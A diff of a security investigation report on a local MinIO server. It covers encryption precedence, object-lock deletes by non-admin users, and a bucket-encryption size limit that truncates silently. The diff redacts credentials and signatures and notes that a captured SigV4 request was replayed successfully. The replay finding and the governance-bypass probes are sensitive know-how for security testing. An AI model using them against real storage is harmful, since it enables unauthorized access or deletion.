@@ -15,7 +15,7 @@ This report answers five questions:
 
 Each requirement section follows the same ordering: **Direct Answer → Reproduction → Observed Output → Responsible Code → Rationale.** Any statement that could not be directly observed is explicitly labeled **[INFERRED]**.
 
-> **Secret handling.** The captured output is reproduced verbatim except that bearer-credential/secret material is redacted with an obvious placeholder: STS `SecretAccessKey` values, the STS `SessionToken` JWT string, the KMS master-key bytes, and fixture user passwords are shown as `<REDACTED_…>`. SigV4 per-request `Signature=` values are one-time request signatures (not reusable credentials) and are left intact so the trace remains faithful. Decoded (non-secret) STS claims — including the session policy — are shown in full because they are the evidence.
+> **Secret handling.** The captured output is reproduced verbatim except that bearer-credential/secret material is redacted with an obvious placeholder: STS `SecretAccessKey` values, the STS `SessionToken` JWT string, the KMS master-key bytes, the root password, and fixture user passwords are shown as `<REDACTED_…>`. **SigV4 per-request `Signature=` values are also redacted (`<REDACTED_SIGV4_SIGNATURE>`).** An earlier revision of this report left them intact on the assumption that a per-request signature is "one-time" and not reusable; that assumption is **incorrect** and has been corrected. A captured SigV4 signature, together with its exact signed-header set (and, for temporary credentials, the `X-Amz-Security-Token`), functions as **short-lived bearer material that can be replayed to authorize an identical request until the signature's validity window closes** — demonstrated at runtime in Requirement 4 (a captured request was replayed to a second `200 OK` with a byte-identical response). Because raw audit records retain the `Authorization` header (and therefore the signature), such records must be treated as **credential-sensitive** and are not safe to publish unredacted. Decoded (non-secret) STS claims — including the session policy — are shown in full because they are the evidence.
 
 ---
 
@@ -32,7 +32,7 @@ repository is this report.
 | Admin/S3 CLI | `mc` `RELEASE.2025-08-13T08-35-41Z` at `/tmp/bin/mc` (its own runtime is `go1.24.6`; independent of the server) |
 | S3/STS/admin client | `boto3` **1.43.47** / `botocore` 1.43.47 (SigV4), Python 3.13.7 |
 | KMS | Built-in KMS via `MINIO_KMS_SECRET_KEY` (well-known MinIO CI test key from `.github/workflows/go.yml`) — enables SSE-S3/auto-encryption for R1 |
-| Root credentials | `minioadmin:minioadmin` — used **only** to provision fixtures (buckets, users, policies, locks); never to trigger the deny-path behaviors |
+| Root credentials | `minioadmin:<REDACTED_ROOT_PASSWORD>` — used **only** to provision fixtures (buckets, users, policies, locks); never to trigger the deny-path behaviors |
 
 ### Toolchain and client versions (verbatim)
 
@@ -74,7 +74,7 @@ their behaviors and deployment IDs never collide.
 from `.github/workflows/go.yml`; its 32-byte base64 secret is redacted here:
 
 ```bash
-MINIO_ROOT_USER=minioadmin MINIO_ROOT_PASSWORD=minioadmin \
+MINIO_ROOT_USER=minioadmin MINIO_ROOT_PASSWORD=<REDACTED_ROOT_PASSWORD> \
 MINIO_KMS_SECRET_KEY="my-minio-key:<REDACTED_KMS_KEY_BASE64_32B>" \
 /tmp/minio-bin server /tmp/miniodata --address :9000 --console-address :9001
 ```
@@ -93,7 +93,7 @@ API: http://10.236.7.56:9000  http://172.17.0.1:9000  http://127.0.0.1:9000
 WebUI: http://10.236.7.56:9001 http://172.17.0.1:9001 http://127.0.0.1:9001
 
 Docs: https://docs.min.io
-WARN: Detected default credentials 'minioadmin:minioadmin', we recommend that you change these values with 'MINIO_ROOT_USER' and 'MINIO_ROOT_PASSWORD' environment variables
+WARN: Detected default credentials 'minioadmin:<REDACTED_ROOT_PASSWORD>', we recommend that you change these values with 'MINIO_ROOT_USER' and 'MINIO_ROOT_PASSWORD' environment variables
 ```
 
 **Four-drive erasure-set server** — used for R3 heal-on-read; a multi-drive set is required so parity
@@ -119,7 +119,7 @@ API: http://10.236.7.56:9100  http://172.17.0.1:9100  http://127.0.0.1:9100
 WebUI: http://10.236.7.56:9101 http://172.17.0.1:9101 http://127.0.0.1:9101
 
 Docs: https://docs.min.io
-WARN: Detected default credentials 'minioadmin:minioadmin', we recommend that you change these values with 'MINIO_ROOT_USER' and 'MINIO_ROOT_PASSWORD' environment variables
+WARN: Detected default credentials 'minioadmin:<REDACTED_ROOT_PASSWORD>', we recommend that you change these values with 'MINIO_ROOT_USER' and 'MINIO_ROOT_PASSWORD' environment variables
 ```
 
 ### Cluster state — `mc admin info` (complete, unedited)
@@ -201,7 +201,7 @@ All fixtures, scripts, and captured evidence live under one scratch root that is
 | single-drive | `:9000` / `:9001` | `/tmp/miniodata` | `EC:0` (1 drive) | `b3de8c20-51f3-4954-9a06-c02b2323ff40` | R1, R2, R4, R5 |
 | 4-drive erasure | `:9100` / `:9101` | `/tmp/minio4/d{1..4}` | `EC:2` (4 drives) | `b12d77b7-4184-4401-9de1-9aae313fe017` | R3 |
 
-**Privilege model.** Root (`minioadmin:minioadmin`) is used **only** to build fixtures. Every deny-path
+**Privilege model.** Root (`minioadmin:<REDACTED_ROOT_PASSWORD>`) is used **only** to build fixtures. Every deny-path
 behavior in R4 and R5 is triggered by a **non-admin principal** — STS temporary credentials scoped by an
 inline session policy (R4), or the basic user `r5basic` whose identity policy grants no admin action (R5).
 This separation is what makes the observed `AccessDenied` results meaningful rather than artifacts of
@@ -270,7 +270,34 @@ if __name__ == "__main__":
 > sink above, which parses each record and re-serializes it — as compact JSON in the JSONL captures, or
 > pretty-printed via `python3 -m json.tool` in the per-requirement excerpts. Field names and values are
 > preserved exactly; only insignificant JSON whitespace is normalized. Bearer/secret material is redacted
-> as described in the header note; SigV4 per-request `Signature=` values are one-time and left intact.
+> as described in the header note; SigV4 per-request `Signature=` values are redacted as
+> `<REDACTED_SIGV4_SIGNATURE>` because — as demonstrated in Requirement 4 — a captured signature plus its
+> signed-header set is replayable short-lived bearer material within the request's validity window, not
+> harmless one-time data.
+
+### Reproduction preamble — shell variables used by every block below
+
+Every `bash` block in this report is written to pass `bash -n` and to be replayable from a clean
+checkout once the operator exports the variables below and supplies the redacted secret values. The
+original investigation's fixture secrets were ephemeral and were torn down (see *Cleanup*); any value
+that satisfies MinIO's minimum-length rule (≥ 8 characters) works, because the access-key *identifiers*
+(shown in full) — not the secret values — are what the deny-path evidence turns on. Per-object
+`versionId` values are not known ahead of time; they are captured at runtime from each `PUT` response
+into `VID_*` variables, as shown in the R2 blocks.
+
+```bash
+# Canonical tooling / scratch locations (set once per shell).
+export MC=/tmp/bin/mc                                   # mc client binary
+export MC_CONFIG_DIR=/tmp/blitzy_investigation/mc-config # isolates mc aliases from any host config
+export INV=/tmp/blitzy_investigation                    # scratch root (deleted on completion)
+# Per-requirement output dir; each section resets this (e.g. OUT="$INV/out/r1").
+export OUT="$INV/out"
+
+# Operator-supplied fixture secrets (the investigation's originals were ephemeral and torn down).
+# Any >=8-character value works; these are NOT the values used in the original run.
+export USER_SECRET='<REDACTED_USER_SECRET>'   # password for fixture IAM users (r1user, r2*user, r4parentuser, ...)
+export SECRET='<REDACTED_SECRET>'             # secret-key for service accounts / STS-child aliases (CVE section)
+```
 
 ---
 
@@ -375,9 +402,9 @@ $MC encrypt info inv9000/r1bucket                  # readback
 $MC admin policy create inv9000 r1write     $INV/policies/r1writepolicy.json
 $MC admin policy create inv9000 r1denypol   $INV/policies/r1denypolicy.json
 $MC admin policy create inv9000 r1polusrpol $INV/policies/r1polusrpolicy.json
-$MC admin user add inv9000 r1user     <REDACTED_USER_SECRET>
-$MC admin user add inv9000 r1denyuser <REDACTED_USER_SECRET>
-$MC admin user add inv9000 r1polusr   <REDACTED_USER_SECRET>
+$MC admin user add inv9000 r1user     "$USER_SECRET"
+$MC admin user add inv9000 r1denyuser "$USER_SECRET"
+$MC admin user add inv9000 r1polusr   "$USER_SECRET"
 $MC admin policy attach inv9000 r1write     --user r1user
 $MC admin policy attach inv9000 r1denypol   --user r1denyuser
 $MC admin policy attach inv9000 r1polusrpol --user r1polusr
@@ -468,7 +495,7 @@ Trigger sequence for each scenario (illustrated for 1A; 1B/1C differ only in use
 ```bash
 nohup $MC admin trace -v --funcname "s3.PutObject" inv9000 > $OUT/trace_1A_boto.txt 2>&1 &
 TPID=$!; sleep 2.5
-python3 $INV/scripts/r1_boto_put.py r1user <REDACTED_USER_SECRET> r1bucket auto-encrypt-1A-boto $OUT/payload_1A.bin
+python3 $INV/scripts/r1_boto_put.py r1user "$USER_SECRET" r1bucket auto-encrypt-1A-boto $OUT/payload_1A.bin
 sleep 3; kill "$TPID"; wait "$TPID" 2>/dev/null
 ```
 
@@ -500,7 +527,7 @@ The complete, unedited `s3.PutObject` verbose trace (`$OUT/trace_1A_boto.txt`). 
 127.0.0.1:9000 X-Amz-Content-Sha256: d6658aef802c6cf84b093a3c5d144a164377807396cb0dfe46f5fe07360ffcee
 127.0.0.1:9000 X-Amz-Date: 20260714T204004Z
 127.0.0.1:9000 Accept-Encoding: identity
-127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r1user/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=9f2cde83cf716c52a1ccef7d9b6878d140ca6273fb25e5c522d8be119ca90cbe
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r1user/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9000 X-Amz-Server-Side-Encryption: AES256
 127.0.0.1:9000 Amz-Sdk-Invocation-Id: 31b4e866-8153-4cb8-a167-8d233c943e95
 127.0.0.1:9000 Amz-Sdk-Request: attempt=1
@@ -534,7 +561,7 @@ A second, independent capture with a different client (`mc cp`, which uses a **s
 127.0.0.1:9000 Proto: HTTP/1.1
 127.0.0.1:9000 Host: 127.0.0.1:9000
 127.0.0.1:9000 Accept-Encoding: zstd,gzip
-127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r1user/20260714/us-east-1/s3/aws4_request,SignedHeaders=host;x-amz-content-sha256;x-amz-date;x-amz-decoded-content-length,Signature=7e4ac282293ee76379a2027f407bab211c812b017cb95fa75ed6758c3798ac52
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r1user/20260714/us-east-1/s3/aws4_request,SignedHeaders=host;x-amz-content-sha256;x-amz-date;x-amz-decoded-content-length,Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9000 Content-Length: 204
 127.0.0.1:9000 Content-Type: application/octet-stream
 127.0.0.1:9000 X-Amz-Content-Sha256: STREAMING-AWS4-HMAC-SHA256-PAYLOAD
@@ -596,7 +623,7 @@ HTTPStatus = 403
 127.0.0.1:9000 X-Amz-Date: 20260714T204034Z
 127.0.0.1:9000 Accept-Encoding: identity
 127.0.0.1:9000 Amz-Sdk-Request: attempt=1
-127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r1denyuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=f0880eab7fed06a394265a607055f08105c7ab2f17442d51043f95c1b011a7cb
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r1denyuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9000 Expect: 100-continue
 127.0.0.1:9000 Amz-Sdk-Invocation-Id: 230e0ab7-c3f4-4066-ab41-f4a587dfd42a
 127.0.0.1:9000 Content-Length: 31
@@ -645,7 +672,7 @@ local_md5    = 773003aef21369c600f92e2e457e1b2f
 127.0.0.1:9000 X-Amz-Content-Sha256: d6658aef802c6cf84b093a3c5d144a164377807396cb0dfe46f5fe07360ffcee
 127.0.0.1:9000 Accept-Encoding: identity
 127.0.0.1:9000 Amz-Sdk-Invocation-Id: afca1e8a-8cae-40fd-871c-430a63d47eb7
-127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r1denyuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date;x-amz-server-side-encryption, Signature=074b96e35137f506c4b24af1f7c0d61483ab3522ecab58694f5e11850a229a61
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r1denyuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date;x-amz-server-side-encryption, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9000 <BLOB>
 127.0.0.1:9000 [RESPONSE] [2026-07-14T20:40:50.442] [ Duration 3.046ms TTFB 2.995689ms ↑ 198 B  ↓ 0 B ]
 127.0.0.1:9000 200 OK
@@ -795,7 +822,7 @@ local_md5    = 773003aef21369c600f92e2e457e1b2f
 127.0.0.1:9000 Host: 127.0.0.1:9000
 127.0.0.1:9000 Amz-Sdk-Invocation-Id: 5c264599-a093-460e-abcd-f8d5e2d02425
 127.0.0.1:9000 Amz-Sdk-Request: attempt=1
-127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r1polusr/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=b1c0de3d958b0d233a4b2cbd57d472429022f3a438e97bc244d4a757e440759a
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r1polusr/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9000 X-Amz-Content-Sha256: d6658aef802c6cf84b093a3c5d144a164377807396cb0dfe46f5fe07360ffcee
 127.0.0.1:9000 Accept-Encoding: identity
 127.0.0.1:9000 Content-Length: 31
@@ -820,6 +847,133 @@ local_md5    = 773003aef21369c600f92e2e457e1b2f
 127.0.0.1:9000 <BLOB>
 127.0.0.1:9000
 ```
+
+### KMS-mode and configuration-size variants
+
+Scenario 1A above ran on the canonical `:9000` server (built-in KMS via `MINIO_KMS_SECRET_KEY`; `MINIO_KMS_AUTO_ENCRYPTION` **unset**). To exercise every distinct precedence condition the question implies, the stored-encryption outcome was re-observed under each KMS / auto-encryption mode — on dedicated single-drive servers each started **once** on its own port and a fresh data directory, then torn down — and the bucket-encryption **configuration-size limit** was probed at and above its boundary. Every output below is complete and unedited.
+
+**Scenario 1D — auto-encryption OFF: KMS present, no bucket default rule, `MINIO_KMS_AUTO_ENCRYPTION` unset. [Observed]**
+
+```bash
+env MINIO_ROOT_USER=minioadmin MINIO_ROOT_PASSWORD="<REDACTED_ROOT_PASSWORD>" \
+    MINIO_KMS_SECRET_KEY="my-minio-key:<REDACTED_KMS_KEY_BASE64_32B>" \
+    /tmp/minio-bin server /tmp/dvoff --address :9210 --console-address :9211
+# then, as root: an unencrypted PUT (no SSE header) to a bucket with NO default-encryption rule
+```
+```
+PUT (no SSE, no default enc, auto OFF) HTTP 200 SSE: None
+HEAD SSE: None
+```
+With neither a request header, a bucket default rule, nor global auto-encryption in force, the object is stored **plaintext**. This is the negative control for 1A: the broad write grant by itself never encrypts. Mechanism — in `BucketSSEConfig.Apply` (`internal/bucket/encryption/bucket-sse-config.go:135`) the receiver is `nil` (no default rule) and `opts.AutoEncrypt` is false, so the `b == nil` arm at `:139-142` returns without setting any SSE header.
+
+**Scenario 1E — global auto-encryption ON: `MINIO_KMS_AUTO_ENCRYPTION=on`, plain bucket, no request header. [Observed]**
+
+```bash
+env MINIO_ROOT_USER=minioadmin MINIO_ROOT_PASSWORD="<REDACTED_ROOT_PASSWORD>" \
+    MINIO_KMS_SECRET_KEY="my-minio-key:<REDACTED_KMS_KEY_BASE64_32B>" \
+    MINIO_KMS_AUTO_ENCRYPTION=on \
+    /tmp/minio-bin server /tmp/dvauto --address :9240 --console-address :9241
+# PUT with no SSE header to a bucket that has NO default-encryption rule configured
+```
+```
+PUT (no SSE header, no bucket default enc, AUTO_ENCRYPTION=on) HTTP 200 SSE: aws:kms
+HEAD SSE: aws:kms | KMSKeyId present: True
+GetBucketEncryption -> ServerSideEncryptionConfigurationNotFoundError
+```
+The bucket carries no default-encryption rule (`GetBucketEncryption` → `ServerSideEncryptionConfigurationNotFoundError`), yet the object is stored **SSE-KMS** (`aws:kms`). The global toggle forces encryption via the `b == nil && AutoEncrypt` arm at `internal/bucket/encryption/bucket-sse-config.go:140-141`, which sinks to SSE-KMS. Auto-encryption thus takes precedence over the write grant even with no bucket-level configuration. The toggle is read by `LookupAutoEncryption()` (env `MINIO_KMS_AUTO_ENCRYPTION`) in `internal/crypto/auto-encryption.go`, populating `globalAutoEncryption`.
+
+**Scenario 1F — missing KMS: no `MINIO_KMS_SECRET_KEY`. [Observed]**
+
+```bash
+env MINIO_ROOT_USER=minioadmin MINIO_ROOT_PASSWORD="<REDACTED_ROOT_PASSWORD>" \
+    /tmp/minio-bin server /tmp/dvnokms --address :9220 --console-address :9221
+# server starts (health 200); every subsequent SSE request/config is then rejected
+```
+```
+(a) SSE-S3 (AES256) PUT   -> 501 NotImplemented | Server side encryption specified but KMS is not configured (KMS not configured for a server side encrypted objects)
+(b) SSE-KMS (aws:kms) PUT -> 501 NotImplemented | Server side encryption specified but KMS is not configured (KMS not configured for a server side encrypted objects)
+(c) PutBucketEncryption(SSE-S3) -> 501 NotImplemented | Server side encryption specified but KMS is not configured
+```
+Without a KMS backend the server still boots, but any attempt to *request* SSE (object header) or to *configure* a bucket default rule is rejected `501 NotImplemented`. Encryption therefore cannot silently "not happen" for an SSE-requested object — the request fails closed rather than storing plaintext.
+
+**Scenario 1G — invalid KMS: malformed `MINIO_KMS_SECRET_KEY` (not valid base64). [Observed]**
+
+```bash
+env MINIO_ROOT_USER=minioadmin MINIO_ROOT_PASSWORD="<REDACTED_ROOT_PASSWORD>" \
+    MINIO_KMS_SECRET_KEY="badkey:not-valid-base64!!!" \
+    /tmp/minio-bin server /tmp/dvbadkms --address :9230 --console-address :9231
+```
+```
+FATAL Failed to connect to KMS: illegal base64 data at input byte 3
+```
+The server **refuses to start** (never binds `:9230`; health probe returns `000`) when the KMS key is malformed — a fail-fast at boot, distinct from the per-request `501` of the missing-KMS case (1F).
+
+**Scenario 1H — bucket-encryption configuration-size limit (`maxBucketSSEConfigSize` = 1 MiB). [Observed]**
+
+`PutBucketEncryptionHandler` reads the body through `io.LimitReader(r.Body, maxBucketSSEConfigSize)`, where `maxBucketSSEConfigSize = 1 * humanize.MiByte = 1048576` (`cmd/globals.go:114`; the reader is at `cmd/bucket-encryption-handlers.go:69`). There is **no explicit oversize rejection**: a body larger than 1 MiB is silently truncated at the 1 MiB boundary and only that prefix is parsed. Whether an oversize request succeeds therefore depends solely on whether the truncated 1 MiB prefix is still well-formed.
+
+Exactly 1 MiB (1048576 bytes), well-formed → accepted:
+```bash
+curl --aws-sigv4 "aws:amz:us-east-1:s3" --user "minioadmin:<REDACTED_ROOT_PASSWORD>" \
+     -X PUT "http://127.0.0.1:9000/r1cfgsize?encryption=" \
+     -H "Content-Type: application/xml" --data-binary @cfg_exact_1MiB.xml
+```
+```
+HTTP 200
+```
+
+1 MiB + 1 byte, extra byte **mid-document** (comment padding before the closing tag) → truncation severs the closing tag:
+```bash
+curl --aws-sigv4 "aws:amz:us-east-1:s3" --user "minioadmin:<REDACTED_ROOT_PASSWORD>" \
+     -X PUT "http://127.0.0.1:9000/r1cfgsize?encryption=" \
+     -H "Content-Type: application/xml" --data-binary @cfg_over_1MiB_plus1.xml
+```
+```
+HTTP 400
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>MalformedXML</Code><Message>The XML you provided was not well-formed or did not validate against our published schema. (XML syntax error on line 1: unexpected EOF)</Message><BucketName>r1cfgsize</BucketName><Resource>/r1cfgsize</Resource><RequestId>18C25D8EF554A5AD</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
+```
+
+1 MiB + 1 byte, extra byte **trailing** (a single trailing space; document body = 192 bytes + 1048385 spaces) → truncation drops only whitespace, the prefix stays valid → **accepted and persisted**:
+```bash
+# pre-state: no default rule (404)
+curl --aws-sigv4 "aws:amz:us-east-1:s3" --user "minioadmin:<REDACTED_ROOT_PASSWORD>" \
+     "http://127.0.0.1:9000/r1cfgtrail?encryption="
+# oversize (1048577 B) with trailing-space padding:
+curl --aws-sigv4 "aws:amz:us-east-1:s3" --user "minioadmin:<REDACTED_ROOT_PASSWORD>" \
+     -X PUT "http://127.0.0.1:9000/r1cfgtrail?encryption=" \
+     -H "Content-Type: application/xml" --data-binary @cfg_over_trailingpad.xml
+# readback:
+curl --aws-sigv4 "aws:amz:us-east-1:s3" --user "minioadmin:<REDACTED_ROOT_PASSWORD>" \
+     "http://127.0.0.1:9000/r1cfgtrail?encryption="
+```
+```
+# pre-state ->
+HTTP 404
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>ServerSideEncryptionConfigurationNotFoundError</Code><Message>The server side encryption configuration was not found</Message><BucketName>r1cfgtrail</BucketName><Resource>/r1cfgtrail</Resource><RequestId>18C25D9909EBA7AC</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
+# PUT ->
+HTTP 200
+# readback ->
+HTTP 200
+<ServerSideEncryptionConfiguration xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Rule><ApplyServerSideEncryptionByDefault><SSEAlgorithm>AES256</SSEAlgorithm></ApplyServerSideEncryptionByDefault></Rule></ServerSideEncryptionConfiguration>
+```
+
+Malformed XML (97 bytes, not well-formed) → rejected:
+```bash
+curl --aws-sigv4 "aws:amz:us-east-1:s3" --user "minioadmin:<REDACTED_ROOT_PASSWORD>" \
+     -X PUT "http://127.0.0.1:9000/r1cfgsize?encryption=" \
+     -H "Content-Type: application/xml" --data-binary @cfg_malformed.xml
+```
+```
+HTTP 400
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>MalformedXML</Code><Message>The XML you provided was not well-formed or did not validate against our published schema. (XML syntax error on line 1: unexpected EOF)</Message><BucketName>r1cfgsize</BucketName><Resource>/r1cfgsize</Resource><RequestId>18C25D8EF755D1B8</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
+```
+
+**[Observed] Net finding (R1-MIN-01).** The 1 MiB cap is enforced by *truncation*, not by an explicit size check: a 1048577-byte body (one byte over the limit) was **accepted** (`HTTP 200`) and its parsed config **persisted** when the excess byte was trailing whitespace, and produced `400 MalformedXML` — never a size-specific error — only when truncation happened to sever a token. Per the read-only investigation constraint this is reported as observed behavior of `cmd/bucket-encryption-handlers.go:69` (with the constant at `cmd/globals.go:114`), not remediated.
+
+---
 
 ### Responsible Code
 
@@ -902,15 +1056,15 @@ Fixtures (locks provisioned as root; every *delete trigger* runs as a non-admin 
 $MC mb --with-lock inv9000/r2bucket
 $MC admin policy create inv9000 r2bypass   $INV/policies/r2bypasspolicy.json
 $MC admin policy create inv9000 r2nobypass $INV/policies/r2nobypasspolicy.json
-$MC admin user add inv9000 r2bypassuser   <REDACTED_USER_SECRET>
-$MC admin user add inv9000 r2nobypassuser <REDACTED_USER_SECRET>
+$MC admin user add inv9000 r2bypassuser   "$USER_SECRET"
+$MC admin user add inv9000 r2nobypassuser "$USER_SECRET"
 $MC admin policy attach inv9000 r2bypass   --user r2bypassuser
 $MC admin policy attach inv9000 r2nobypass --user r2nobypassuser
 # PUT 5 objects (root) and record each VersionId (via r2_delete_locked.py putobj)
 # apply locks (root, canonical mc): legal hold ON / compliance 3d / governance 3d
-$MC legalhold set inv9000/r2bucket/c1_legalhold  --vid <VID>
-$MC retention set compliance 3d inv9000/r2bucket/c2_compliance --vid <VID>
-$MC retention set governance 3d inv9000/r2bucket/c3_gov --vid <VID>   # (c4_gov, c5_gov likewise)
+$MC legalhold set inv9000/r2bucket/c1_legalhold  --vid "$VID_C1"
+$MC retention set compliance 3d inv9000/r2bucket/c2_compliance --vid "$VID_C2"
+$MC retention set governance 3d inv9000/r2bucket/c3_gov --vid "$VID_C3"   # (c4_gov, c5_gov likewise)
 ```
 
 Driver `$INV/scripts/r2_delete_locked.py` (canonical boto3 SigV4; `delver` issues the version-specific DELETE, optionally setting the governance-bypass header):
@@ -1031,7 +1185,7 @@ Each condition is triggered independently, capturing its own trace and audit sli
 a0=$(wc -l < $INV/out/audit.jsonl)
 nohup $MC admin trace -v --funcname "s3.DeleteObject" inv9000 > $OUT/trace_C1_legalhold.txt 2>&1 &
 T=$!; sleep 2.5
-python3 $INV/scripts/r2_delete_locked.py delver r2nobypassuser <REDACTED_USER_SECRET> r2bucket c1_legalhold <VID>
+python3 $INV/scripts/r2_delete_locked.py delver r2nobypassuser "$USER_SECRET" r2bucket c1_legalhold "$VID_C1"
 sleep 3; kill "$T"; wait "$T" 2>/dev/null
 tail -n +$((a0+1)) $INV/out/audit.jsonl > $OUT/audit_C1_legalhold.jsonl
 ```
@@ -1103,7 +1257,7 @@ Complete `s3.DeleteObject` trace (`$OUT/trace_C1_legalhold.txt`):
 127.0.0.1:9000 Accept-Encoding: identity
 127.0.0.1:9000 Amz-Sdk-Invocation-Id: 5bee9eca-c449-431f-8e29-dbdb2e560ad5
 127.0.0.1:9000 Amz-Sdk-Request: attempt=1
-127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r2nobypassuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=cb424222b6d9f5715558f7ea220f4139ca4d3e3cebf8ea44193f85471657d880
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r2nobypassuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9000 X-Amz-Date: 20260714T205540Z
 127.0.0.1:9000
 127.0.0.1:9000 [RESPONSE] [2026-07-14T20:55:40.557] [ Duration 765µs TTFB 724.633µs ↑ 131 B  ↓ 369 B ]
@@ -1147,7 +1301,7 @@ Complete `s3.DeleteObject` trace (`$OUT/trace_C2_compliance.txt`):
 127.0.0.1:9000 Amz-Sdk-Request: attempt=1
 127.0.0.1:9000 X-Amz-Content-Sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
 127.0.0.1:9000 X-Amz-Date: 20260714T205546Z
-127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r2nobypassuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=8b0e95dfffbef957fed81d42727d702e3259b6147300b41d5397b29b331ef5a4
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r2nobypassuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9000 Content-Length: 0
 127.0.0.1:9000 User-Agent: Boto3/1.43.47 md/Botocore#1.43.47 ua/2.1 os/linux#6.6.122+ md/arch#x86_64 lang/python#3.13.7 md/pyimpl#CPython m/c,e,N,D,a cfg/retry-mode#legacy Botocore/1.43.47
 127.0.0.1:9000 Accept-Encoding: identity
@@ -1192,7 +1346,7 @@ Complete `s3.DeleteObject` trace (`$OUT/trace_C3_gov_nobypass.txt`):
 127.0.0.1:9000 User-Agent: Boto3/1.43.47 md/Botocore#1.43.47 ua/2.1 os/linux#6.6.122+ md/arch#x86_64 lang/python#3.13.7 md/pyimpl#CPython m/D,c,N,a,e cfg/retry-mode#legacy Botocore/1.43.47
 127.0.0.1:9000 Accept-Encoding: identity
 127.0.0.1:9000 Amz-Sdk-Request: attempt=1
-127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r2nobypassuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=bd39812784ea0df18c4cdc8ea09158fe08a2be50e2dd71b528715571b1dbe5bb
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r2nobypassuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9000 Content-Length: 0
 127.0.0.1:9000 X-Amz-Content-Sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
 127.0.0.1:9000 X-Amz-Date: 20260714T205552Z
@@ -1239,7 +1393,7 @@ Complete `s3.DeleteObject` trace (`$OUT/trace_C4_gov_bypass_noperm.txt`):
 127.0.0.1:9000 User-Agent: Boto3/1.43.47 md/Botocore#1.43.47 ua/2.1 os/linux#6.6.122+ md/arch#x86_64 lang/python#3.13.7 md/pyimpl#CPython m/a,e,c,D,N cfg/retry-mode#legacy Botocore/1.43.47
 127.0.0.1:9000 Amz-Sdk-Invocation-Id: e0e54a6e-fe43-430e-95a7-00b821f60568
 127.0.0.1:9000 Amz-Sdk-Request: attempt=1
-127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r2nobypassuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-bypass-governance-retention;x-amz-content-sha256;x-amz-date, Signature=73a92557d357ac3434407275ba2ff079039c420c20f9e188257dac5f444d07cf
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r2nobypassuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-bypass-governance-retention;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9000 X-Amz-Bypass-Governance-Retention: true
 127.0.0.1:9000 X-Amz-Content-Sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
 127.0.0.1:9000 X-Amz-Date: 20260714T205558Z
@@ -1287,7 +1441,7 @@ Complete `s3.DeleteObject` trace (`$OUT/trace_C5_gov_bypass_perm.txt`):
